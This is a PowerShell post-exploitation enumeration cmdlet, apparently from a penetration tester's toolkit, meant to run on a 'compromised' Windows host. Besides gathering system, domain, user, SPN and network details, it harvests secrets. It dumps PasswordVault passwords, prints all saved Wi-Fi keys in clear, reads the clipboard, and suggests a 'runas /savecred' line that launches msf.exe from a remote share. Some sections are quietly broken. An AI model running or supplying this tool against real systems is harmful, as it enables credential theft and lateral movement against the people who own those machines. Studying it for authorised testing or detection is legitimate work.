<#
.SYNOPSIS
This cmdlet was created to perform enumeration of a Windows system using PowerShell.


.DESCRIPTION
This cmdlet enumerates a system that has been compromised to better understand what is running on the target. This does not test for any PrivEsc methods it only enumerates machine info. Use Test-PrivEsc to search for possible exploits.


.PARAMETER FilePath
This parameter defines the location to save a file containing the results of this cmdlets execution


.EXAMPLE
Get-InitialEnum
# This example returns information on the local device

.EXAMPLE
Get-InitialEnum -FilePath C:\Temp\enum.txt
# This example saves the results of this command to the file C:\Temp\enum.txt


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.LINK
https://roberthsoborne.com
https://writeups.osbornepro.com
https://www.btps-secpack.com
https://github.com/tobor88
https://gitlab.com/tobor88
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.youracclaim.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286


.INPUTS
System.Management.Automation.PSObject


.OUTPUTS
System.Object

#>
Function Get-InitialEnum {
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$False,
                ValueFromPipeline=$False)]  # End Parameter
            [String]$FilePath
        )  # End param

BEGIN
{

    Function Get-AntiVirusProduct {
        [CmdletBinding()]
            param (
                [Parameter(
                    Mandatory=$False,
                    Position=0,
                    ValueFromPipeline=$True,
                    ValueFromPipelineByPropertyName=$true)]
        [Alias('Computer')]
        [string]$ComputerName=$env:COMPUTERNAME )  # End param

        $AntiVirusProducts = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntiVirusProduct" -ComputerName $ComputerName

        $Ret = @()
        ForEach ($AntiVirusProduct in $AntiVirusProducts)
        {
           #The values are retrieved from: http://community.kaseya.com/resources/m/knowexch/1020.aspx
            Switch ($AntiVirusProduct.productState)
            {
                "262144" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
                "262160" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
                "266240" {$defstatus = "Up to date" ;$rtstatus = "Enabled"}
                "266256" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
                "393216" {$defstatus = "Up to date" ;$rtstatus = "Disabled"}
                "393232" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
                "393488" {$defstatus = "Out of date" ;$rtstatus = "Disabled"}
                "397312" {$defstatus = "Up to date" ;$rtstatus = "Enabled"}
                "397328" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}
                "397584" {$defstatus = "Out of date" ;$rtstatus = "Enabled"}

                Default {$defstatus = "Unknown" ;$rtstatus = "Unknown"}
            }  # End Switch

            $HashTable = @{}
            $HashTable.Computername = $ComputerName
            $HashTable.Name = $AntiVirusProduct.DisplayName
            $HashTable.'Product GUID' = $AntiVirusProduct.InstanceGuid
            $HashTable.'Product Executable' = $AntiVirusProduct.PathToSignedProductExe
            $HashTable.'Reporting Exe' = $AntiVirusProduct.PathToSignedReportingExe
            $HashTable.'Definition Status' = $DefStatus
            $HashTable.'Real-time Protection Status' = $RtStatus

            $Ret += New-Object -TypeName "PSObject" -Property $HashTable

        }  # End ForEach

        $Ret

    }  # End Function Get-AntiVirusProduct

}  # End BEGIN
PROCESS
{
#================================================================
#  SECURITY PATCHES
#================================================================
    Write-Output "=================================`n| OPERATING SYSTEM INFORMATION  |`n================================="
    Get-CimInstance -ClassName "Win32_OperatingSystem" | Select-Object -Property Name,Caption,Description,CSName,Version,BuildNumber,OSArchitecture,SerialNumber,RegisteredUser

    Write-Output "=================================`n|      DOMAIN INFORMATION       |`n================================="
    $DomainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $Domain = New-Object -TypeName System.DirectoryServices.DirectoryEntry
    $DCs = $DomainObj.DomainControllers
    $PDC = $DomainObj.PdcRoleOwner.Name

    If ($Domain)
    {

        Write-Output "DOMAIN DN: $($Domain.DistinguishedName.ToString())"
        Write-Output "------------------------------------------------------"
        Write-Output "PASSWORD POLICY"
        Write-Output "------------------------------------------------------"
        Write-Output "History Count: $($Domain.pwdHistoryLength.ToString())"
        Write-Output "Password Properties: $($Domain.pwdProperties.ToString())"
        Write-Output "Max Age: $($Domain.maxPwdAge.ToString())"
        Write-Output "Minimum Character Length: $($Domain.minPwdLength.ToString())"
        Write-Output "Lockout Threshold: $($Domain.lockoutThreshold.ToString())"
        Write-Output "Last Changed: $($Domain.whenChanged.ToString())"
        Write-Output "When Created: $($Domain.whenCreated.ToString())"

    }  # End If

    If ($DCs)
    {

        Write-Output "`n`n--------------------------`nDOMAIN CONTROLLERS`n--------------------------"

    }  # End If

    $DCs | Select-Object -Property Name,OSVersion,Domain | Format-Table -AutoSize

    If ($PDC)
    {

        Write-Output "PRIMARY DC: $PDC"

    }  # End If

    Write-Output "=================================`n| HOTFIXES INSTALLED ON DEVICE  |`n================================="
    If (Get-Command Get-HotFix)
    {

        Get-HotFix

    }  # End If
    Else
    {

        Get-CimInstance -Query 'SELECT * FROM Win32_QuickFixEngineering'

    }  # End Else

    $WDigestCaching = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest").UseLogonCredential
    Switch ($WDigestCaching)
    {

        '0' { Write-Output "[*] WDigest Caching is disabled" }

        '1' { Write-Output "[*] WDigest caching is enabled!" }

        $Null { Write-Output "[*] WDigest caching is enabled!" }

    }  # End Switch

#===================================================================
#  NETWORK SHARES AND DRIVES
#===================================================================
Write-Output "=================================`n|  NEWORK SHARE DRIVES          |`n================================="
Get-CimInstance -ClassName Win32_Share

#===================================================================
#  FIND UNSIGNED DRIVERS
#===================================================================

    Write-Output "UNSIGNED DRIVERS`n--------------------------------------------"
    cmd /c 'DriverQuery -SI' | Select-String "False"

#===================================================================
#  FIND SIGNED DRIVERS
#===================================================================
#    Write-Output "SIGNED DRIVERS`n--------------------------------------------"
#    cmd /c 'DriverQuery -SI' | Select-String -Pattern "True"

#==========================================================================
#  ANTIVIRUS APPLICATION INFORMATION
#==========================================================================
    Write-Output "=================================`n|    ANTI-VIRUS INFORMATION     |`n================================="
    Get-AntiVirusProduct

#==========================================================================
#  USER, USER PRIVILEDGES, AND GROUP INFO
#==========================================================================
    Write-Output "================================================`n|  MEMBERS OF THE LOCAL ADMINISTRATORS GROUP   |`n================================================"

    {

        Get-LocalGroupMember -Group "Administrators" | Format-Table -Property "Name","PrincipalSource"

    }  # End
    Write-Output "=================================`n|       USERS LIST              |`n================================="
    Try
    {

        Get-LocalUser | Select-Object -Property Name,Enabled,LastLogon,SID,PasswordRequired | Format-Table -AutoSize

    }  # End Try
    Catch
    {

        net user
        # Get-CimInstance -ClassName "Win32_UserAccount" | Format-Table -AutoSize

    }  # End Catch

    Write-Output "=================================`n|       GROUPS LIST             |`n================================="
    Try
    {

        Get-LocalGroup | Select-Object -Property Name,Description,SID | Format-Table -AutoSize

    }  # End Try
    Catch
    {

        net group
        # Get-CimInstance -ClassName "Win32_GroupUser" | Format-Table -AutoSize

    }  # End Catch

    Write-Output "`n=================================`n|  CURRENT USER PRIVS           |`n================================="
    whoami /priv


    Write-Output "`n=================================`n| USERS WHO HAVE HOME DIRS      |`n================================="
    Get-ChildItem -Path C:\Users | Select-Object -Property "Name"


    Write-Output "`n=================================`n|  SPN ACCOUNTS                 |`n================================="
    $Search = New-Object -TypeName DirectoryServices.DirectorySearcher([ADSI]"")
    $Search.Filter = "(servicePrincipalName=*)"
    $Results = $Search.Findall()
    $SPNObj = @()

    ForEach ($Result in $Results)
    {

    	$UserEntry = $Result.GetDirectoryEntry()
        $SPNObj += New-Object -TypeName PSObject -Property @{Name=$($UserEntry.name);DN=$($UserEntry.distinguishedName);Category=$($UserEntry.objectCategory)}

    }  # End ForEach

    $SPNObj | Format-Table


    Write-Output "=================================`n|  CLIPBOARD CONTENTS           |`n================================="
    Get-Clipboard


    Write-Output "=================================`n|  SAVED CREDENTIALS            |`n================================="
    cmdkey /list
    Write-Output "If you find a saved credential it can be used issuing a command in the below format: "
    Write-Output 'runas /savecred /user:WORKGROUP\Administrator "\\###.###.###.###\FileShare\msf.exe"'

    [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object -TypeName Windows.Security.Credentials.PasswordVault).RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ }


    Write-Output "=================================`n|  LOGGGED ON USERS             |`n================================="
    Get-CimInstance -ClassName Win32_LoggedOnUser


    Write-Output "=========================================`n|  CURRENT KERBEROS TICKET PERMISSIONS  |`n========================================="
    [System.Security.Principal.WindowsIdentity]::GetCurrent()

#==========================================================================
#  NETWORK INFORMATION
#==========================================================================
    Write-Output "=================================`n|   LISTENING PORTS             |`n================================="
    Get-CimInstance -Class Win32_SerialPort | Select-Object -Property Name, Description, DeviceID
    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
    $Connections = $TCPProperties.GetActiveTcpListeners()
    ForEach ($Connection in $Connections)
    {
        If ($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } Else { $IPType = "IPv6" }
        $OutputObj = New-Object -TypeName PSobject -Property @{LocalAddress=$Connection.Address; ListeningPort=$Connection.Port; AddressType=$IPType}
        $OutputObj

    }  # End ForEach

    Write-Output "=================================`n|  ESTABLISHED CONNECTIONS      |`n================================="
    $OutputObj = @()
    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
    $Connections = $TCPProperties.GetActiveTcpConnections()
    ForEach ($Connection in $Connections)
    {

        If ($Connection.LocalEndPoint.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } Else { $IPType = "IPv6" }
        $OutputObj += New-Object -TypeName PSObject -Property @{LocalAddress=$Connection.LocalEndPoint.Address; LocalPort=$Connection.LocalEndPoint.Port; RemoteAddress=$Connection.RemoteEndPoint.Address; RemotePort=$Connection.RemoteEndPoint.Port; State=$Connection.State; AddressType=$IPType}

    }  # End ForEach
    $OutputObj | Format-Table -AutoSize

    Write-Output "=================================`n|  DNS SERVERS                  |`n================================="
    Get-DnsClientServerAddress -AddressFamily "IPv4" | Select-Object -Property "InterfaceAlias","ServerAddresses" | Format-Table -AutoSize


    Write-Output "=================================`n|  ROUTING TABLE                |`n================================="
    Get-NetRoute | Select-Object -Property "DestinationPrefix","NextHop","RouteMetric" | Format-Table -AutoSize


    Write-Output "=================================`n|    ARP NEIGHBOR TABLE         |`n================================="
    Get-NetNeighbor | Select-Object -Property "IPAddress","LinkLayerAddress","State" | Format-Table -AutoSize


    Write-Output "=================================`n|  Wi-Fi Passwords              |`n================================="
    (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize

#==========================================================================
#  APPLICATION INFO
#==========================================================================
    Write-Output "=================================`n| INSTALLED APPLICATIONS        |`n================================="
    $Paths = 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\'
    ForEach ($Path in $Paths)
    {

        Get-ChildItem -Path $Path | Get-ItemProperty | Select-Object -Property "DisplayName","Publisher","InstallDate","DisplayVersion" | Format-Table -AutoSize

    }  # End ForEach

    Write-Output "=================================`n|    STARTUP APPLICATIONS       |`n================================="
    Get-CimInstance -ClassName "Win32_StartupCommand" | Select-Object -Property "Name","Command","Location","User" | Format-Table -AutoSize

    $StartupAppCurrentUser = (Get-ChildItem -Path "C:\Users\$env:USERNAME\Start Menu\Programs\Startup" | Select-Object -ExpandProperty "Name" | Out-String).Trim()
    If ($StartupAppCurrentUser)
    {

        Write-Output "$StartupAppCurrentUser automatically starts for $env:USERNAME"

    }  # End If

    $StartupAppAllUsers = (Get-ChildItem -Path "C:\Users\All Users\Start Menu\Programs\Startup" | Select-Object -ExpandProperty "Name" | Out-String).Trim()
    If ($StartupAppAllUsers)
    {

        Write-Output "$StartupAppAllUsers automatically starts for All Users"

    }  # End If

    Write-Output "============================================================================"
    Write-Output "Check below values for binaries you may be able to execute as another user."
    Write-Output "============================================================================"
    Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
    Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
    Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
    Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'


#==========================================================================
#  PROCESS AND SERVICE ENUMERATION
#==========================================================================
    Write-Output "=================================`n|  PROCESS ENUMERATION          |`n================================="
    Get-Process -IncludeUserName | Format-Table -AutoSize


    Write-Output "=================================`n|  SERVICE ENUMERATION          |`n================================="
    Get-CimInstance -ClassName Win32_Service


    Write-Output "=================================`n|  ENVIRONMENT VARIABLES        |`n================================="
    [Environment]::GetEnvironmentVariables() | Format-Table -AutoSize

#==========================================================================
# BROWSER INFO
#==========================================================================
    Write-Output "=================================`n|  BROWSER ENUMERATION          |`n================================="
    Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main\" -Name "start page" | Select-Object -Property "Start Page"

    $Bookmarks = [Environment]::GetFolderPath('Favorites')
    Get-ChildItem -Path $BookMarks -Recurse -Include "*.url" | ForEach-Object {

        Get-Content -Path $_.FullName | Select-String -Pattern URL

    }  # End ForEach-Object

}  # End PROCESS

}  # End Function Get-InitialEnum
